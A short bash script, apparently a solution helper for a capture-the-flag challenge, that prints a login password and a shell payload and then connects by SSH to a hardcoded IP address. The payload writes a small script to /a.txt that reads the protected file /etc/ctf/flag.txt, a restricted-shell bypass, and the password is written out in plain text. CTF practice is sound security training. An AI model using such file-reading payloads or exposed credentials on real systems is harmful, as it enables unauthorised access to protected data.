#/usr/bin/bash

echo "PASSWORD: sa7Neiyi"
echo "PAYLOAD: echo \"set line=(\"\`echo '$'\`\"<)\" > /a.txt; echo \"echo \"\`echo '$'\`\"line\" >> /a.txt; source /a.txt < /etc/ctf/flag.txt"

ssh rmrfer@178.154.210.26

